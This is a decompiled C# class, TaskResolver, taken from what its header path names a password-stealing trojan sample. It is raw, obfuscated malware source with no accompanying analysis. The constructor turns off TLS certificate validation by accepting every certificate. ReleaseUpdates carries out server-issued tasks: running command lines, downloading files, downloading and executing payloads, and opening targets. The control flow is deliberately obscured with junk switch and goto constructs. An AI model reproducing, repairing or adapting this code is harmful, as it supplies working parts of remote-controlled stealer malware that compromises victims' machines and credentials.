// Decompiled with JetBrains decompiler
// Type: TaskResolver
// Assembly: Ajowans, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9451E92-9872-44E9-A53B-32BF899B0E6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Stealer.gen-ca27c07cc9fddcd8bc07b2b9aa3406ab019fb54797bf2163b190217e9c17ce6a.exe

using Ajowans;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Security;

public class TaskResolver
{
  public TaskResolver(Entity7 result)
  {
    this.Result = result;
    try
    {
      try
      {
        StubInfo.RegisterFile(DriveService.RegisterFile() | (SecurityProtocolType) TemplateService.RegisterFile(2576));
      }
      catch
      {
      }
      RemoteCertificateValidationCallback pathList1 = ConditionSerializer.RegisterFile();
      // ISSUE: reference to a compiler-generated field
      RemoteCertificateValidationCallback generatorCache1 = TaskResolver.\u003C\u003Ec.pathList;
      if (generatorCache1 == null)
      {
label_4:
        switch (6)
        {
          case 0:
            goto label_4;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (TaskResolver.\u002Ector);
            }
            // ISSUE: reference to a compiler-generated field
            generatorCache1 = TaskResolver.\u003C\u003Ec.pathList = (RemoteCertificateValidationCallback) ((pathList, generatorCache, previousHandler, namesEnabled) => TemplateService.RegisterFile(4444) != 0);
            break;
        }
      }
      DatabaseToken.RegisterFile((RemoteCertificateValidationCallback) BitmapTree.RegisterFile((Delegate) pathList1, (Delegate) generatorCache1));
    }
    catch
    {
    }
  }

  public Entity7 Result { get; }

  public List<int> ReleaseUpdates(IEnumerable<Entity6> tasks)
  {
    List<int> pathList1 = FileEditor.RegisterFile();
    try
    {
      IEnumerator<Entity6> pathList2 = Config.RegisterFile((object) tasks);
      try
      {
        while (RegistryContext.RegisterFile((object) pathList2))
        {
          Entity6 entity6 = RegistryList.RegisterFile((object) pathList2);
          if (FormSet.RegisterFile(StreamFactory.RegisterFile((object) this), AddinType.RegisterFile((object) entity6)))
          {
label_4:
            switch (3)
            {
              case 0:
                goto label_4;
              default:
                if (false)
                {
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle = __methodref (TaskResolver.ReleaseUpdates);
                }
                CommandLineUpdate pathList3 = MenuItemQueue.RegisterFile();
                if (DomainResolver.RegisterFile((object) pathList3, EmulatorFactory.RegisterFile((object) entity6)))
                {
label_8:
                  switch (7)
                  {
                    case 0:
                      goto label_8;
                    default:
                      if (StoreSet.RegisterFile((object) pathList3, entity6))
                      {
label_10:
                        switch (7)
                        {
                          case 0:
                            goto label_10;
                          default:
                            ServerSet.RegisterFile((object) pathList1, DiskFactory.RegisterFile((object) entity6));
                            break;
                        }
                      }
                      else
                        break;
                      break;
                  }
                }
                DownloadUpdate pathList4 = EmulatorList.RegisterFile();
                if (MethodEventArgs.RegisterFile((object) pathList4, EmulatorFactory.RegisterFile((object) entity6)))
                {
label_13:
                  switch (1)
                  {
                    case 0:
                      goto label_13;
                    default:
                      if (MemoryScope.RegisterFile((object) pathList4, entity6))
                      {
label_15:
                        switch (1)
                        {
                          case 0:
                            goto label_15;
                          default:
                            ServerSet.RegisterFile((object) pathList1, DiskFactory.RegisterFile((object) entity6));
                            break;
                        }
                      }
                      else
                        break;
                      break;
                  }
                }
                DownloadAndExecuteUpdate pathList5 = WindowDictionary.RegisterFile();
                if (LineSite.RegisterFile((object) pathList5, EmulatorFactory.RegisterFile((object) entity6)))
                {
label_18:
                  switch (1)
                  {
                    case 0:
                      goto label_18;
                    default:
                      if (PartitionDictionary.RegisterFile((object) pathList5, entity6))
                      {
label_20:
                        switch (1)
                        {
                          case 0:
                            goto label_20;
                          default:
                            ServerSet.RegisterFile((object) pathList1, DiskFactory.RegisterFile((object) entity6));
                            break;
                        }
                      }
                      else
                        break;
                      break;
                  }
                }
                OpenUpdate pathList6 = FormHelper.RegisterFile();
                if (DatabaseDictionary.RegisterFile((object) pathList6, EmulatorFactory.RegisterFile((object) entity6)))
                {
label_23:
                  switch (5)
                  {
                    case 0:
                      goto label_23;
                    default:
                      if (NetworkCollection.RegisterFile((object) pathList6, entity6))
                      {
label_25:
                        switch (6)
                        {
                          case 0:
                            goto label_25;
                          default:
                            ServerSet.RegisterFile((object) pathList1, DiskFactory.RegisterFile((object) entity6));
                            continue;
                        }
                      }
                      else
                        continue;
                  }
                }
                else
                  continue;
            }
          }
        }
label_28:
        switch (1)
        {
          case 0:
            goto label_28;
        }
      }
      finally
      {
        if (pathList2 != null)
        {
label_30:
          switch (1)
          {
            case 0:
              goto label_30;
            default:
              DeploymentDesigner.RegisterFile((object) pathList2);
              break;
          }
        }
      }
    }
    catch
    {
    }
    return pathList1;
  }
}
